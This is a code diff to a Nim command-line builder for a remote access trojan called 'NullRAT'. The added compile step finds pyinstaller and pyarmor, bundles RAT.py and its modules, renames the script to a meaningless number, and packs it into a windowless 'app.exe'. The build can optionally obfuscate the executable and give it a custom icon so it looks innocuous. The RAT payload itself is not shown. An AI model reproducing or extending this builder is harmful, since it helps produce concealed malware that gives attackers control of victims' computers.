@@ -2,7 +2,12 @@ import std/terminal
 import std/os
 import std/browsers
 import std/osproc
+import std/random
+import std/envvars
+import std/files
 import std/[strutils, strformat]
+
+randomize()
 
 # Windows-only
 proc cls() = 
@@ -72,7 +77,7 @@ proc compiler(): int =
     echo ""
     var obfuscate: bool
     var compress: bool
-    var icon: bool
+    var icon: bool = false
         
     stdout.styledWriteLine({styleBright}, "Do you want to obfuscate the executable? (Y/n)")
     var input: char = getch()
@@ -91,8 +96,13 @@ proc compiler(): int =
     var iconPath: string
     if input == 'Y' or input == 'y': 
         icon = true
-        echo "Enter custom icon (.ico file) path:"
+        echo "Drag and drop .ico file here, and press ENTER..."
+        echo "(Or type it's full path)"
         iconPath = readLine(stdin);
+        iconPath = iconPath.strip();
+        while fileExists(iconPath) == false:
+            echo "Icon file not found! Please try again."
+            iconPath = readLine(stdin)
     elif input == 'Q' or input == 'q': return 0
     else: icon = false
 
@@ -111,29 +121,105 @@ proc compiler(): int =
         echo "Executable will have custom icon"
         echo "Path: ", iconPath
     echo ""
-    stdout.styledWriteLine({styleBright}, "Would you like to compile now? (Y/n)")
+    stdout.styledWriteLine(fgRed, {styleBright}, "Would you like to compile now? (Y/n)")
     input = getch()
     if input == 'N' or input == 'n':
         echo "- User declined request. Aborting..."
-        sleep(1000)
+        sleep(1500)
         return 0
     elif input == 'Q' or input == 'q': return 0
     else:
-        stdout.styledWriteLine(fgCyan, "- Compiling using selected settings...") 
-        stdout.styledWriteLine(fgCyan, "- Checking pyinstaller")
-		# Find working pyinstaller executable
+        stdout.styledWriteLine(fgCyan, {styleBright}, "- Compiling using selected settings...")
+        
+        stdout.styledWriteLine(fgCyan, {styleBright}, "- Checking pyinstaller...")
+        # Find working pyinstaller executable
         var wherePy = splitLines(execCmdEx("where pyinstaller").output)
-        var pyinstWorking: string;
+        var pyinst: string = "undef";
         for pyinstaller in wherePy:
             if pyinstaller == "": continue
-            var code = $execCmdEx(pyinstaller).exitCode
-			if code == 2:
-				pyinstWorking = pyinstaller
-				break
-		echo "Found! ", pyinstWorking
-		stdout.styledWriteLine(fgCyan, "- Checking pyarmor")
-		# Find working pyarmor executable
-		
+            var code = execCmdEx(pyinstaller).exitCode
+            if code == 2:
+                pyinst = pyinstaller
+                break
+        if "undef" notin pyinst:
+            echo "Found! ", pyinst
+        else:
+            echo "[FATAL] Pyinstaller executable not found."
+            echo "Please check your environment variables and python installation"
+            echo "before continuing..... Exiting in 5 seconds"
+            sleep(5000)
+            return 0
+        
+        stdout.styledWriteLine(fgCyan, {styleBright}, "- Checking pyarmor...")
+        # Find working pyarmor executable
+        var whereArmor = splitLines(execCmdEx("where pyarmor-7").output)
+        var armor: string = "undef";
+        for pyarmor in whereArmor:
+            if pyarmor == "": continue
+            var code = execCmdEx(pyarmor).exitCode
+            if code == 2:
+                armor = pyarmor
+                break
+        if "undef" notin armor:
+            echo "Found! ", armor
+        else:
+            echo "[FATAL] Pyarmor executable not found."
+            echo "Please check your environment variables and python installation"
+            echo "before continuing..... Exiting in 5 seconds"
+            sleep(5000)
+            return 0
+            
+        # Compiling
+        stdout.styledWriteLine(fgCyan, {styleBright}, "- Creating tempdir...")
+        var folderName = "compiling-" & $rand(6969)
+        createDir(folderName)
+        setCurrentDir(dirr / "NullRAT" / folderName)
+        var currdir = getCurrentDir()
+        echo currdir
+        
+        echo dirr / "NullRAT" / "RAT.py"
+        copyFile(dirr / "NullRAT" / "RAT.py", currdir / "RAT.py")
+        echo dirr / "NullRAT" / "Variables.py"
+        copyFile(dirr / "NullRAT" / "Variables.py", currdir / "Variables.py")
+        if icon:
+            copyFile(iconPath, currdir / "custom_icon.ico")
+            
+        var modules: seq[string]
+        for path in walkDir(dirr / "NullRAT" / "modules"):
+            if "create_new" in $path.path.split("\\")[^1]:
+                continue
+            echo $path.path
+            copyFile($path.path, currdir / $path.path.split("\\")[^1])
+            modules.add($path.path.split("\\")[^1])
+
+        var pyinst_cmd = pyinst & " --onefile --noconsole --hidden-import mss"
+        var pyarmor_cmd = armor & fmt" pack --clean -e "" --onefile --noconsole --hidden-import mss"""
+        
+        var dat: string = fmt" --add-data ""Variables.py;."""
+        pyinst_cmd.add(dat)
+        for m in modules:
+            dat = fmt" --add-data ""{m};."""
+            pyinst_cmd.add(dat)
+        
+        if icon:
+            if obfuscate:
+                pyarmor_cmd = armor & fmt" pack --clean -e "" --onefile --noconsole --icon=custom_icon.ico --hidden-import mss"""
+            else:
+                pyinst_cmd = pyinst_cmd & " --icon=custom_icon.ico"
+        
+        moveFile(currdir / "RAT.py", currdir / "765678976567.py")
+        pyinst_cmd.add(" 765678976567.py")
+        
+        echo pyinst_cmd
+        if obfuscate: discard execShellCmd(pyarmor_cmd)
+        else: discard execShellCmd(pyinst_cmd)
+        
+        if fileExists(currdir / "dist" / "765678976567.exe"):
+            moveFile(currdir / "dist" / "765678976567.exe", dirr / "app.exe")
+        setCurrentDir(dirr / "NullRAT")
+        removeDir(folderName)
+        
+        stdout.styledWriteLine(fgGreen, {styleBright},  "Build Successful!")
         discard getch()
     
 proc variablesCreator(x: int) = 
@@ -218,7 +304,7 @@ proc packageInstaller() =
     var status: int = execShellCmd("python --version")
     var status2: int = execShellCmd("py --version")
     if status == 0 or status2 == 0:
-        echo "- Python installed!"
+        stdout.styledWriteLine(fgGreen, {styleBright}, "- Python installed!")
         echo ""
         stdout.styledWriteLine({styleBright}, "[2] Checking if packages already installed...")
         var result = execCmdEx("pip freeze")
@@ -233,7 +319,7 @@ proc packageInstaller() =
             
             if allInstalled:
                 stdout.styledWriteLine(fgGreen, {styleBright}, "- All packages installed and detected!\n\nProceeding on with variables creation...")
-                sleep(1500)
+                sleep(1000)
                 variablesCreator(0)
             else:
                 stdout.styledWriteLine({styleBright}, "[3] Installing/Updating dependencies...")
